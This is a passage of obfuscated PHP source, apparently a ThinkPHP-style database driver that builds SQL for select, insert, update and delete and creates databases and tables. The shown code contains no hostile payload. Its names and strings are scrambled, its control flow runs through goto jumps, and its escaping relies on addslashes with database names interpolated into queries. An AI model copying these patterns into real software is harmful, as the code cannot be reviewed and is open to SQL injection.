$bÈ»„ãáŞ×[259] . $this->parseWhereItem($this->parseKey($Fò×ŒÖ), $DÊç±‚ÈØ¦) . $bÈ»„ãáŞ×[807]; } $d”Ôº…íê .= implode($bÈ»„ãáŞ×[908], $e¦Œí×ö‹); } else { $d”Ôº…íê .= $this->parseWhereItem($this->parseKey($a˜äôâ»ğ), $f—ÍŞ¾ë²); } } $d”Ôº…íê .= $bÈ»„ãáŞ×[277] . $eÄá·Òè­ñ; } $d”Ôº…íê = substr($d”Ôº…íê, 0, -strlen($eÄá·Òè­ñ)); } return empty($d”Ôº…íê) ? $bÈ»„ãáŞ×[43] : $bÈ»„ãáŞ×[914] . $d”Ôº…íê; } protected function parseWhereItem($AæµØ¾Ç´, $c¬ë‘£ğ) { $c÷šíÅßÚ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Cˆå™Ì™ = $c÷šíÅßÚ[43]; if (is_array($c¬ë‘£ğ)) { if (is_string($c¬ë‘£ğ[0])) { $aš„Í‹—‹ = strtolower($c¬ë‘£ğ[0]); if (in_array($c¬ë‘£ğ[0], array($c÷šíÅßÚ[897], $c÷šíÅßÚ[915], $c÷šíÅßÚ[916], $c÷šíÅßÚ[917], $c÷šíÅßÚ[918], $c÷šíÅßÚ[919]))) { $Cˆå™Ì™ .= $AæµØ¾Ç´ . $c÷šíÅßÚ[60] . $c¬ë‘£ğ[0] . $c÷šíÅßÚ[60] . $this->parseValue($c¬ë‘£ğ[1]); } elseif (preg_match($c÷šíÅßÚ[920], $c¬ë‘£ğ[0])) { $Cˆå™Ì™ .= $AæµØ¾Ç´ . $c÷šíÅßÚ[60] . $this->exp[$aš„Í‹—‹] . $c÷šíÅßÚ[60] . $this->parseValue($c¬ë‘£ğ[1]); } elseif (preg_match($c÷šíÅßÚ[921], $c¬ë‘£ğ[0])) { if (is_array($c¬ë‘£ğ[1])) { $b¦ÑÍƒ¥¯ô = isset($c¬ë‘£ğ[2]) ? strtoupper($c¬ë‘£ğ[2]) : $c÷šíÅßÚ[906]; if (in_array($b¦ÑÍƒ¥¯ô, array($c÷šíÅßÚ[905], $c÷šíÅßÚ[906], $c÷šíÅßÚ[907]))) { $CÒ”¸òÅÛ” = array(); foreach ($c¬ë‘£ğ[1] as $E…‡³¨Óé‹) { $CÒ”¸òÅÛ”[] = $AæµØ¾Ç´ . $c÷šíÅßÚ[60] . $this->exp[$aš„Í‹—‹] . $c÷šíÅßÚ[60] . $this->parseValue($E…‡³¨Óé‹); } $Cˆå™Ì™ .= $c÷šíÅßÚ[259] . implode($c÷šíÅßÚ[60] . $b¦ÑÍƒ¥¯ô . $c÷šíÅßÚ[60], $CÒ”¸òÅÛ”) . $c÷šíÅßÚ[807]; } } else { $Cˆå™Ì™ .= $AæµØ¾Ç´ . $c÷šíÅßÚ[60] . $this->exp[$aš„Í‹—‹] . $c÷šíÅßÚ[60] . $this->parseValue($c¬ë‘£ğ[1]); } } elseif ($c÷šíÅßÚ[296] == $aš„Í‹—‹) { $Cˆå™Ì™ .= $c÷šíÅßÚ[805] . $AæµØ¾Ç´ . $c÷šíÅßÚ[60] . $c¬ë‘£ğ[1] . $c÷šíÅßÚ[922]; } elseif (preg_match($c÷šíÅßÚ[923], $c¬ë‘£ğ[0])) { if (isset($c¬ë‘£ğ[2]) && $c÷šíÅßÚ[296] == $c¬ë‘£ğ[2]) { $Cˆå™Ì™ .= $AæµØ¾Ç´ . $c÷šíÅßÚ[60] . $this->exp[$aš„Í‹—‹] . $c÷šíÅßÚ[60] . $c¬ë‘£ğ[1]; } else { if (is_string($c¬ë‘£ğ[1])) { $c¬ë‘£ğ[1] = explode($c÷šíÅßÚ[57], $c¬ë‘£ğ[1]); } $c¥Àïš‘´¬ = implode($c÷šíÅßÚ[57], $this->parseValue($c¬ë‘£ğ[1])); $Cˆå™Ì™ .= $AæµØ¾Ç´ . $c÷šíÅßÚ[60] . $this->exp[$aš„Í‹—‹] . $c÷šíÅßÚ[805] . $c¥Àïš‘´¬ . $c÷šíÅßÚ[807]; } } elseif (preg_match($c÷šíÅßÚ[924], $c¬ë‘£ğ[0])) { $a§øçÂÄ“ = is_string($c¬ë‘£ğ[1]) ? explode($c÷šíÅßÚ[57], $c¬ë‘£ğ[1]) : $c¬ë‘£ğ[1]; $Cˆå™Ì™ .= $c÷šíÅßÚ[805] . $AæµØ¾Ç´ . $c÷šíÅßÚ[60] . $this->exp[$aš„Í‹—‹] . $c÷šíÅßÚ[60] . $this->parseValue($a§øçÂÄ“[0]) . $c÷šíÅßÚ[908] . $this->parseValue($a§øçÂÄ“[1]) . $c÷šíÅßÚ[277]; } else { think_exception(think_lang($c÷šíÅßÚ[911]) . $c÷šíÅßÚ[14] . $c¬ë‘£ğ[0]); } } else { $bàÏóËÉ = count($c¬ë‘£ğ); $fèÄ¸µÅĞ = isset($c¬ë‘£ğ[$bàÏóËÉ - 1]) ? strtoupper($c¬ë‘£ğ[$bàÏóËÉ - 1]) : $c÷šíÅßÚ[43]; if (in_array($fèÄ¸µÅĞ, array($c÷šíÅßÚ[905], $c÷šíÅßÚ[906], $c÷šíÅßÚ[907]))) { $bàÏóËÉ = $bàÏóËÉ - 1; } else { $fèÄ¸µÅĞ = $c÷šíÅßÚ[905]; } for ($EÑòòíù§Š = 0; $EÑòòíù§Š < $bàÏóËÉ; $EÑòòíù§Š++) { $a§øçÂÄ“ = is_array($c¬ë‘£ğ[$EÑòòíù§Š]) ? $c¬ë‘£ğ[$EÑòòíù§Š][1] : $c¬ë‘£ğ[$EÑòòíù§Š]; if ($c÷šíÅßÚ[296] == strtolower($c¬ë‘£ğ[$EÑòòíù§Š][0])) { $Cˆå™Ì™ .= $c÷šíÅßÚ[259] . $AæµØ¾Ç´ . $c÷šíÅßÚ[60] . $a§øçÂÄ“ . $c÷šíÅßÚ[922] . $fèÄ¸µÅĞ . $c÷šíÅßÚ[60]; } else { $d‡ïÁëö = is_array($c¬ë‘£ğ[$EÑòòíù§Š]) ? $this->exp[strtolower($c¬ë‘£ğ[$EÑòòíù§Š][0])] : $c÷šíÅßÚ[897]; if (!$d‡ïÁëö && is_array($c¬ë‘£ğ[$EÑòòíù§Š]) && in_array($c¬ë‘£ğ[$EÑòòíù§Š][0], array($c÷šíÅßÚ[897], $c÷šíÅßÚ[915], $c÷šíÅßÚ[916], $c÷šíÅßÚ[917], $c÷šíÅßÚ[918], $c÷šíÅßÚ[919]))) { $d‡ïÁëö = $c¬ë‘£ğ[$EÑòòíù§Š][0]; } $Cˆå™Ì™ .= $c÷šíÅßÚ[259] . $AæµØ¾Ç´ . $c÷šíÅßÚ[60] . $d‡ïÁëö . $c÷šíÅßÚ[60] . $this->parseValue($a§øçÂÄ“) . $c÷šíÅßÚ[922] . $fèÄ¸µÅĞ . $c÷šíÅßÚ[60]; } } $Cˆå™Ì™ = substr($Cˆå™Ì™, 0, -4); } } else { $Cˆå™Ì™ .= $AæµØ¾Ç´ . $c÷šíÅßÚ[925] . $this->parseValue($c¬ë‘£ğ); } return $Cˆå™Ì™; } protected function parseThinkWhere($Bä­ÓÏš¡, $cØ¦î¯‡§) { $EÙ¢»³´¨ =& $_SERVER[¹÷ˆ§éÒ°ú]; $aíÁƒ«–³ = $EÙ¢»³´¨[43]; switch ($Bä­ÓÏš¡) { case $EÙ¢»³´¨[350]: $aíÁƒ«–³ = $cØ¦î¯‡§; break; case $EÙ¢»³´¨[909]: $aíÁƒ«–³ = is_string($cØ¦î¯‡§) ? $cØ¦î¯‡§ : substr($this->parseWhere($cØ¦î¯‡§), 6); break; case $EÙ¢»³´¨[926]: parse_str($cØ¦î¯‡§, $ağ¡°´ò¢¾); if (isset($ağ¡°´ò¢¾[$EÙ¢»³´¨[904]])) { $eğñ¯Ç»÷Ô = $EÙ¢»³´¨[60] . strtoupper($ağ¡°´ò¢¾[$EÙ¢»³´¨[904]]) . $EÙ¢»³´¨[60]; unset($ağ¡°´ò¢¾[$EÙ¢»³´¨[904]]); } else { $eğñ¯Ç»÷Ô = $EÙ¢»³´¨[908]; } $BÂ–†ê¢‘ = array(); foreach ($ağ¡°´ò¢¾ as $b™Ø‚ªºóƒ => $A¨¶³ÃÇæ—) { $BÂ–†ê¢‘[] = $this->parseKey($b™Ø‚ªºóƒ) . $EÙ¢»³´¨[925] . $this->parseValue($A¨¶³ÃÇæ—); } $aíÁƒ«–³ = implode($eğñ¯Ç»÷Ô, $BÂ–†ê¢‘); break; } return $aíÁƒ«–³; } protected function parseLimit($bÀêƒÚË) { $D¬ŒÁïŠµ… =& $_SERVER[¹÷ˆ§éÒ°ú]; return !empty($bÀêƒÚË) ? $D¬ŒÁïŠµ…[58] . $bÀêƒÚË . $D¬ŒÁïŠµ…[60] : $D¬ŒÁïŠµ…[43]; } protected function parseJoin($c„ Î£¶à‹) { $fÏÜïÖâŒæ =& $_SERVER[¹÷ˆ§éÒ°ú]; $bÅÂÓ‚µ = $fÏÜïÖâŒæ[43]; if (!empty($c„ Î£¶à‹)) { if (is_array($c„ Î£¶à‹)) { foreach ($c„ Î£¶à‹ as $e·„–ùéø‹ => $Cî³İÁ™÷…) { if (!1 !== stripos($Cî³İÁ™÷…, $fÏÜïÖâŒæ[927])) { $bÅÂÓ‚µ .= $fÏÜïÖâŒæ[60] . $Cî³İÁ™÷…; } else { $bÅÂÓ‚µ .= $fÏÜïÖâŒæ[928] . $Cî³İÁ™÷…; } } } else { $bÅÂÓ‚µ .= $fÏÜïÖâŒæ[928] . $c„ Î£¶à‹; } } $bÅÂÓ‚µ = preg_replace($fÏÜïÖâŒæ[929], think_config($fÏÜïÖâŒæ[832]) . $fÏÜïÖâŒæ[930], $bÅÂÓ‚µ); return $bÅÂÓ‚µ; } protected function parseOrder($ašâ·„Ê¢) { $e¤ƒÈ†¸Í¶ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (is_array($ašâ·„Ê¢)) { $CÑ¨ƒÛ‡× = array(); foreach ($ašâ·„Ê¢ as $F»—³ÅÂ’ó => $F¨ÚôœÚ¬æ) { if (is_numeric($F»—³ÅÂ’ó)) { $CÑ¨ƒÛ‡×[] = $this->parseKey($F¨ÚôœÚ¬æ); } else { $F¨ÚôœÚ¬æ = in_array(strtoupper(trim($F¨ÚôœÚ¬æ)), array($e¤ƒÈ†¸Í¶[931], $e¤ƒÈ†¸Í¶[932])) ? $e¤ƒÈ†¸Í¶[60] . $F¨ÚôœÚ¬æ : $e¤ƒÈ†¸Í¶[43]; if (preg_match($e¤ƒÈ†¸Í¶[933], $F»—³ÅÂ’ó)) { $CÑ¨ƒÛ‡×[] = $this->parseKey($F»—³ÅÂ’ó) . $F¨ÚôœÚ¬æ; } else { think_exception($e¤ƒÈ†¸Í¶[934] . $F»—³ÅÂ’ó); } } } $ašâ·„Ê¢ = implode($e¤ƒÈ†¸Í¶[57], $CÑ¨ƒÛ‡×); } return !empty($ašâ·„Ê¢) ? $e¤ƒÈ†¸Í¶[935] . $ašâ·„Ê¢ : $e¤ƒÈ†¸Í¶[43]; } protected function parseGroup($BÇÑ±è‚”Â) { $DŒŠ¨ñíµØ =& $_SERVER[¹÷ˆ§éÒ°ú]; return !empty($BÇÑ±è‚”Â) ? $DŒŠ¨ñíµØ[936] . $BÇÑ±è‚”Â : $DŒŠ¨ñíµØ[43]; } protected function parseHaving($C”Ö¦©¸ñ) { $Dßö…ïÃÁ =& $_SERVER[¹÷ˆ§éÒ°ú]; return !empty($C”Ö¦©¸ñ) ? $Dßö…ïÃÁ[937] . $C”Ö¦©¸ñ : $Dßö…ïÃÁ[43]; } protected function parseComment($fåŠÇïŠ) { $d¡ÛÍ÷‹‰¦ =& $_SERVER[¹÷ˆ§éÒ°ú]; return !empty($fåŠÇïŠ) ? $d¡ÛÍ÷‹‰¦[938] . $fåŠÇïŠ . $d¡ÛÍ÷‹‰¦[939] : $d¡ÛÍ÷‹‰¦[43]; } protected function parseDistinct($FéˆÌ ôÁº) { $D¢Õ°ñ¿‡ =& $_SERVER[¹÷ˆ§éÒ°ú]; return !empty($FéˆÌ ôÁº) ? $D¢Õ°ñ¿‡[940] : $D¢Õ°ñ¿‡[43]; } protected function parseUnion($EáÅÃ©) { $E˜„¢…Ö° =& $_SERVER[¹÷ˆ§éÒ°ú]; if (empty($EáÅÃ©)) { return $E˜„¢…Ö°[43]; } if (isset($EáÅÃ©[$E˜„¢…Ö°[347]])) { $a¬Ã´ç°ïê = $E˜„¢…Ö°[941]; unset($EáÅÃ©[$E˜„¢…Ö°[347]]); } else { $a¬Ã´ç°ïê = $E˜„¢…Ö°[942]; } foreach ($EáÅÃ© as $c·Úäöí„¹) { $DˆÙ ”„¶‰[] = $a¬Ã´ç°ïê . (is_array($c·Úäöí„¹) ? $this->buildSelectSql($c·Úäöí„¹) : $c·Úäöí„¹); } return implode($E˜„¢…Ö°[60], $DˆÙ ”„¶‰); } public function insert($aÜŒÍ÷¾Œ¹, $EôìĞ‹¬ë× = array(), $c¾¹Å˜ø”Ü = false) { goto Aİ·„ª£ï; Aİ·„ª£ï: $bŒš’„¸¾Ö =& $_SERVER[¹÷ˆ§éÒ°ú]; $FËĞáÖöÄó = $FæÕ×Øƒï = array(); $this->model = $EôìĞ‹¬ë×[$bŒš’„¸¾Ö[280]]; goto a˜º¼Šˆ¡²; CÒ®†¶• ®: $DÛ±ö…¤„ .= $this->parseComment(!empty($EôìĞ‹¬ë×[$bŒš’„¸¾Ö[352]]) ? $EôìĞ‹¬ë×[$bŒš’„¸¾Ö[352]] : $bŒš’„¸¾Ö[43]); return $this->execute($DÛ±ö…¤„, $this->parseBind(!empty($EôìĞ‹¬ë×[$bŒš’„¸¾Ö[284]]) ? $EôìĞ‹¬ë×[$bŒš’„¸¾Ö[284]] : array())); goto aŸõ±­¨; a˜º¼Šˆ¡²: foreach ($aÜŒÍ÷¾Œ¹ as $fŠŠÄ Áí× => $BçÛºé¶Ìë) { if (is_array($BçÛºé¶Ìë) && $bŒš’„¸¾Ö[296] == $BçÛºé¶Ìë[0]) { $FæÕ×Øƒï[] = $this->parseKey($fŠŠÄ Áí×); $FËĞáÖöÄó[] = $BçÛºé¶Ìë[1]; } elseif (is_scalar($BçÛºé¶Ìë) || is_null($BçÛºé¶Ìë)) { $FæÕ×Øƒï[] = $this->parseKey($fŠŠÄ Áí×); $FËĞáÖöÄó[] = $this->parseValue($BçÛºé¶Ìë); } } $DÛ±ö…¤„ = ($c¾¹Å˜ø”Ü ? $bŒš’„¸¾Ö[809] : $bŒš’„¸¾Ö[810]) . $bŒš’„¸¾Ö[811] . $this->parseTable($EôìĞ‹¬ë×[$bŒš’„¸¾Ö[278]]) . $bŒš’„¸¾Ö[805] . implode($bŒš’„¸¾Ö[57], $FæÕ×Øƒï) . $bŒš’„¸¾Ö[806] . implode($bŒš’„¸¾Ö[57], $FËĞáÖöÄó) . $bŒš’„¸¾Ö[807]; $DÛ±ö…¤„ .= $this->parseLock(isset($EôìĞ‹¬ë×[$bŒš’„¸¾Ö[766]]) ? $EôìĞ‹¬ë×[$bŒš’„¸¾Ö[766]] : !1); goto CÒ®†¶• ®; aŸõ±­¨: } public function selectInsert($A¦¸õÍ¤Ú, $ašñİÖ·Ç, $føƒğ¨æÃ¯ = array()) { goto CàÛÅ…¼ˆ§; dÆ¢Œî ƒ: array_walk($A¦¸õÍ¤Ú, array($this, $c®ì™‹î»µ[808])); $c‡ÎÁÊ”Êé = $c®ì™‹î»µ[943] . $this->parseTable($ašñİÖ·Ç) . $c®ì™‹î»µ[805] . implode($c®ì™‹î»µ[57], $A¦¸õÍ¤Ú) . $c®ì™‹î»µ[922]; $c‡ÎÁÊ”Êé .= $this->buildSelectSql($føƒğ¨æÃ¯); goto e¨‡‘±…»¢; CàÛÅ…¼ˆ§: $c®ì™‹î»µ =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->model = $føƒğ¨æÃ¯[$c®ì™‹î»µ[280]]; if (is_string($A¦¸õÍ¤Ú)) { $A¦¸õÍ¤Ú = explode($c®ì™‹î»µ[57], $A¦¸õÍ¤Ú); } goto dÆ¢Œî ƒ; e¨‡‘±…»¢: return $this->execute($c‡ÎÁÊ”Êé, $this->parseBind(!empty($føƒğ¨æÃ¯[$c®ì™‹î»µ[284]]) ? $føƒğ¨æÃ¯[$c®ì™‹î»µ[284]] : array())); goto f²ÚÚ›•ËÔ; f²ÚÚ›•ËÔ: } public function update($B™– ¢²ä, $AÃîÇÎ¾Şµ) { $b°©Œ¤é³« =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->model = $AÃîÇÎ¾Şµ[$b°©Œ¤é³«[280]]; $f¦‘¬í’ö = $b°©Œ¤é³«[944] . $this->parseTable($AÃîÇÎ¾Şµ[$b°©Œ¤é³«[278]]) . $this->parseSet($B™– ¢²ä) . $this->parseWhere(!empty($AÃîÇÎ¾Şµ[$b°©Œ¤é³«[274]]) ? $AÃîÇÎ¾Şµ[$b°©Œ¤é³«[274]] : $b°©Œ¤é³«[43]) . $this->parseOrder(!empty($AÃîÇÎ¾Şµ[$b°©Œ¤é³«[361]]) ? $AÃîÇÎ¾Şµ[$b°©Œ¤é³«[361]] : $b°©Œ¤é³«[43]) . $this->parseLimit(!empty($AÃîÇÎ¾Şµ[$b°©Œ¤é³«[291]]) ? $AÃîÇÎ¾Şµ[$b°©Œ¤é³«[291]] : $b°©Œ¤é³«[43]) . $this->parseLock(isset($AÃîÇÎ¾Şµ[$b°©Œ¤é³«[766]]) ? $AÃîÇÎ¾Şµ[$b°©Œ¤é³«[766]] : !1) . $this->parseComment(!empty($AÃîÇÎ¾Şµ[$b°©Œ¤é³«[352]]) ? $AÃîÇÎ¾Şµ[$b°©Œ¤é³«[352]] : $b°©Œ¤é³«[43]); return $this->execute($f¦‘¬í’ö, $this->parseBind(!empty($AÃîÇÎ¾Şµ[$b°©Œ¤é³«[284]]) ? $AÃîÇÎ¾Şµ[$b°©Œ¤é³«[284]] : array())); } public function delete($cÛ¬ßºÜÃ = array()) { $Aó¸Úò½† =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->model = $cÛ¬ßºÜÃ[$Aó¸Úò½†[280]]; $DŒù©°é = $Aó¸Úò½†[945] . $this->parseTable($cÛ¬ßºÜÃ[$Aó¸Úò½†[278]]) . $this->parseWhere(!empty($cÛ¬ßºÜÃ[$Aó¸Úò½†[274]]) ? $cÛ¬ßºÜÃ[$Aó¸Úò½†[274]] : $Aó¸Úò½†[43]) . $this->parseOrder(!empty($cÛ¬ßºÜÃ[$Aó¸Úò½†[361]]) ? $cÛ¬ßºÜÃ[$Aó¸Úò½†[361]] : $Aó¸Úò½†[43]) . $this->parseLimit(!empty($cÛ¬ßºÜÃ[$Aó¸Úò½†[291]]) ? $cÛ¬ßºÜÃ[$Aó¸Úò½†[291]] : $Aó¸Úò½†[43]) . $this->parseLock(isset($cÛ¬ßºÜÃ[$Aó¸Úò½†[766]]) ? $cÛ¬ßºÜÃ[$Aó¸Úò½†[766]] : !1) . $this->parseComment(!empty($cÛ¬ßºÜÃ[$Aó¸Úò½†[352]]) ? $cÛ¬ßºÜÃ[$Aó¸Úò½†[352]] : $Aó¸Úò½†[43]); return $this->execute($DŒù©°é, $this->parseBind(!empty($cÛ¬ßºÜÃ[$Aó¸Úò½†[284]]) ? $cÛ¬ßºÜÃ[$Aó¸Úò½†[284]] : array())); } public function select($D¹ñªĞ¾¼à = array()) { goto aÜ¤¹ò¢í; cÁ˜’¸Ê›·: if ($bó»øöî¨ && !1 !== $bŠ“Š±Æ§‡) { think_cache($F‹¾êÉ·–š, $bŠ“Š±Æ§‡, $bó»øöî¨); } return $bŠ“Š±Æ§‡; goto c¬ï¥¹Ì­å; aÜ¤¹ò¢í: $d¸äë¥ÒÇ =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->model = $D¹ñªĞ¾¼à[$d¸äë¥ÒÇ[280]]; $A±±±¢Êï = $this->buildSelectSql($D¹ñªĞ¾¼à); goto D„ÙìÑŠÑÚ; D„ÙìÑŠÑÚ: $bó»øöî¨ = isset($D¹ñªĞ¾¼à[$d¸äë¥ÒÇ[348]]) ? $D¹ñªĞ¾¼à[$d¸äë¥ÒÇ[348]] : !1; if ($bó»øöî¨) { $F‹¾êÉ·–š = is_string($bó»øöî¨[$d¸äë¥ÒÇ[101]]) ? $bó»øöî¨[$d¸äë¥ÒÇ[101]] : $d¸äë¥ÒÇ[946] . md5($A±±±¢Êï); $eêäÊŒ÷Ö = think_cache($F‹¾êÉ·–š, $d¸äë¥ÒÇ[43], $bó»øöî¨); if (!1 !== $eêäÊŒ÷Ö) { return $eêäÊŒ÷Ö; } } $bŠ“Š±Æ§‡ = $this->query($A±±±¢Êï, $this->parseBind(!empty($D¹ñªĞ¾¼à[$d¸äë¥ÒÇ[284]]) ? $D¹ñªĞ¾¼à[$d¸äë¥ÒÇ[284]] : array())); goto cÁ˜’¸Ê›·; c¬ï¥¹Ì­å: } public function buildSelectSql($E÷®½âÕˆ½ = array()) { goto Aªîª–ŸÎ‹; Aªîª–ŸÎ‹: $A¹¯¥‚Â¤õ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (isset($E÷®½âÕˆ½[$A¹¯¥‚Â¤õ[351]])) { if (strpos($E÷®½âÕˆ½[$A¹¯¥‚Â¤õ[351]], $A¹¯¥‚Â¤õ[57])) { list($dëÖæÆÄ³Ê, $F÷öœÊ“½¦) = explode($A¹¯¥‚Â¤õ[57], $E÷®½âÕˆ½[$A¹¯¥‚Â¤õ[351]]); } else { $dëÖæÆÄ³Ê = $E÷®½âÕˆ½[$A¹¯¥‚Â¤õ[351]]; } $dëÖæÆÄ³Ê = $dëÖæÆÄ³Ê ? $dëÖæÆÄ³Ê : 1; $F÷öœÊ“½¦ = isset($F÷öœÊ“½¦) ? $F÷öœÊ“½¦ : (is_numeric($E÷®½âÕˆ½[$A¹¯¥‚Â¤õ[291]]) ? $E÷®½âÕˆ½[$A¹¯¥‚Â¤õ[291]] : 20); $Fğª¼¿¡× = $F÷öœÊ“½¦ * ((int) $dëÖæÆÄ³Ê - 1); $E÷®½âÕˆ½[$A¹¯¥‚Â¤õ[291]] = $Fğª¼¿¡× . $A¹¯¥‚Â¤õ[57] . $F÷öœÊ“½¦; } if (think_config($A¹¯¥‚Â¤õ[947])) { $f©ùƒŒ÷º‘ = $A¹¯¥‚Â¤õ[948] . md5(serialize($E÷®½âÕˆ½)); $dÁ™è‰¬¢² = think_cache($f©ùƒŒ÷º‘); if ($dÁ™è‰¬¢²) { return $dÁ™è‰¬¢²; } } goto cöµÊ…£ÛØ; d¤ÔÅéÎ¼Ù: return $aŸóùÕäğ¥; goto B ’°Êà¦; cöµÊ…£ÛØ: $aŸóùÕäğ¥ = $this->parseSql($this->selectSql, $E÷®½âÕˆ½); $aŸóùÕäğ¥ .= $this->parseLock(isset($E÷®½âÕˆ½[$A¹¯¥‚Â¤õ[766]]) ? $E÷®½âÕˆ½[$A¹¯¥‚Â¤õ[766]] : !1); if (isset($f©ùƒŒ÷º‘)) { think_cache($f©ùƒŒ÷º‘, $aŸóùÕäğ¥); } goto d¤ÔÅéÎ¼Ù; B ’°Êà¦: } public function parseSql($b«‚Ù…œ»¸, $CŠŸ–È†‘ß = array()) { $f®¨ÇÏ÷íì =& $_SERVER[¹÷ˆ§éÒ°ú]; $b«‚Ù…œ»¸ = str_replace(array($f®¨ÇÏ÷íì[949], $f®¨ÇÏ÷íì[950], $f®¨ÇÏ÷íì[951], $f®¨ÇÏ÷íì[952], $f®¨ÇÏ÷íì[953], $f®¨ÇÏ÷íì[954], $f®¨ÇÏ÷íì[955], $f®¨ÇÏ÷íì[956], $f®¨ÇÏ÷íì[957], $f®¨ÇÏ÷íì[958], $f®¨ÇÏ÷íì[959]), array($this->parseTable("{$CŠŸ–È†‘ß[$f®¨ÇÏ÷íì[278]]}"), $this->parseDistinct(isset($CŠŸ–È†‘ß[$f®¨ÇÏ÷íì[960]]) ? $CŠŸ–È†‘ß[$f®¨ÇÏ÷íì[960]] : !1), $this->parseField(!empty($CŠŸ–È†‘ß[$f®¨ÇÏ÷íì[272]]) ? $CŠŸ–È†‘ß[$f®¨ÇÏ÷íì[272]] : $f®¨ÇÏ÷íì[188]), $this->parseJoin(!empty($CŠŸ–È†‘ß[$f®¨ÇÏ÷íì[281]]) ? $CŠŸ–È†‘ß[$f®¨ÇÏ÷íì[281]] : $f®¨ÇÏ÷íì[43]), $this->parseWhere(!empty($CŠŸ–È†‘ß[$f®¨ÇÏ÷íì[274]]) ? $CŠŸ–È†‘ß[$f®¨ÇÏ÷íì[274]] : $f®¨ÇÏ÷íì[43]), $this->parseGroup(!empty($CŠŸ–È†‘ß[$f®¨ÇÏ÷íì[961]]) ? $CŠŸ–È†‘ß[$f®¨ÇÏ÷íì[961]] : $f®¨ÇÏ÷íì[43]), $this->parseHaving(!empty($CŠŸ–È†‘ß[$f®¨ÇÏ÷íì[962]]) ? $CŠŸ–È†‘ß[$f®¨ÇÏ÷íì[962]] : $f®¨ÇÏ÷íì[43]), $this->parseOrder(!empty($CŠŸ–È†‘ß[$f®¨ÇÏ÷íì[361]]) ? $CŠŸ–È†‘ß[$f®¨ÇÏ÷íì[361]] : $f®¨ÇÏ÷íì[43]), $this->parseLimit(!empty($CŠŸ–È†‘ß[$f®¨ÇÏ÷íì[291]]) ? $CŠŸ–È†‘ß[$f®¨ÇÏ÷íì[291]] : $f®¨ÇÏ÷íì[43]), $this->parseUnion(!empty($CŠŸ–È†‘ß[$f®¨ÇÏ÷íì[346]]) ? $CŠŸ–È†‘ß[$f®¨ÇÏ÷íì[346]] : $f®¨ÇÏ÷íì[43]), $this->parseComment(!empty($CŠŸ–È†‘ß[$f®¨ÇÏ÷íì[352]]) ? $CŠŸ–È†‘ß[$f®¨ÇÏ÷íì[352]] : $f®¨ÇÏ÷íì[43])), $b«‚Ù…œ»¸); return $b«‚Ù…œ»¸; } public function getLastSql($E–¬•¨‰Ñ = '') { return $E–¬•¨‰Ñ ? $this->modelSql[$E–¬•¨‰Ñ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($b–†¹ÈáÇ¿) { return addslashes($b–†¹ÈáÇ¿); } public function setModel($A¸£¼ß”‡ª) { $this->model = $A¸£¼ß”‡ª; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($eÜéÓ˜öô, $d‘«Ş’¢âİ = '') { $this->database = $eÜéÓ˜öô; $this->type = $d‘«Ş’¢âİ; } public function model($aˆ¡éİå§‰ = '') { return new ModelBase($aˆ¡éİå§‰, $_SERVER[¹÷ˆ§éÒ°ú][43], $this->database); } public function db($EØ‹ò‚ƒÅÜ = false) { goto B‚‰ßÓ‘òœ; e¸‚ÓùŠßª: $this->database = $AŸÍ²ÔÁ·; $E•¤ŸÏÁµš->execute("\x75\163\x65\40\140{$CÉ‰‘ÜƒÚ„}\x60"); return $E•¤ŸÏÁµš; goto fÃê« ¡›ë; EÜ·»Íµ– : $this->database = $AŸÍ²ÔÁ·; $E•¤ŸÏÁµš = $this->model()->db(); try { $Då¢•Àâ = $E•¤ŸÏÁµš->execute("\163\150\x6f\x77\40\x64\x61\x74\141\142\x61\x73\x65\x73\40\154\x69\x6b\x65\x20\47{$CÉ‰‘ÜƒÚ„}\47"); } catch (Exception $a×ñ»Ëˆ†) { } goto CÆ•…Æß¸°; CÆ•…Æß¸°: if (!$Då¢•Àâ) { $E•¤ŸÏÁµš->execute("\143\162\x65\x61\164\145\x20\x64\x61\164\x61\142\x61\163\x65\40\140{$CÉ‰‘ÜƒÚ„}\140"); } $AŸÍ²ÔÁ·[$aïİš§Æ×È[875]] = $CÉ‰‘ÜƒÚ„; if ($AŸÍ²ÔÁ·[$aïİš§Æ×È[717]] == $aïİš§Æ×È[718]) { $AŸÍ²ÔÁ·[$aïİš§Æ×È[719]] .= $aïİš§Æ×È[963] . $CÉ‰‘ÜƒÚ„; } goto e¸‚ÓùŠßª; B‚‰ßÓ‘òœ: $aïİš§Æ×È =& $_SERVER[¹÷ˆ§éÒ°ú]; $AŸÍ²ÔÁ· = array_change_key_case($this->database); if ($this->type == $aïİš§Æ×È[19] || !$EØ‹ò‚ƒÅÜ) { return $this->model()->db(); } goto EÉ©±‡ÆšÔ; EÉ©±‡ÆšÔ: $CÉ‰‘ÜƒÚ„ = $AŸÍ²ÔÁ·[$aïİš§Æ×È[875]]; $AŸÍ²ÔÁ·[$aïİš§Æ×È[875]] = $aïİš§Æ×È[43]; if ($AŸÍ²ÔÁ·[$aïİš§Æ×È[717]] == $aïİš§Æ×È[718]) { $FİŒŞŸ¯¥´ = $AŸÍ²ÔÁ·[$aïİš§Æ×È[719]]; $AŸÍ²ÔÁ·[$aïİš§Æ×È[719]] = substr($FİŒŞŸ¯¥´, 0, strrpos($FİŒŞŸ¯¥´, $aïİš§Æ×È[963])); } goto EÜ·»Íµ– ; fÃê« ¡›ë: } public function createTable($c‹‘¡®‡Ó™, $D†£Åã¶‰Î = null) { $c¶šÓÄí×’ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!IO::exist($c‹‘¡®‡Ó™)) { ActionCall($c¶šÓÄí×’[964], !0, 0); show_json(LNG($c¶šÓÄí×’[965]), !1); } $B˜éŠƒ¹œ³ = sqlSplit(IO::getContent($c‹‘¡®‡Ó™)); foreach ($B˜éŠƒ¹œ³ as $C¸¸Ö‡îĞĞ) { if ($D†£Åã¶‰Î) { $FÁÓÔğƒÖè = stripos($C¸¸Ö‡îĞĞ, $c¶šÓÄí×’[966]) === 0; if ($FÁÓÔğƒÖè) { $D†£Åã¶‰Î->task[$c¶šÓÄí×’[967]] += 1; } } 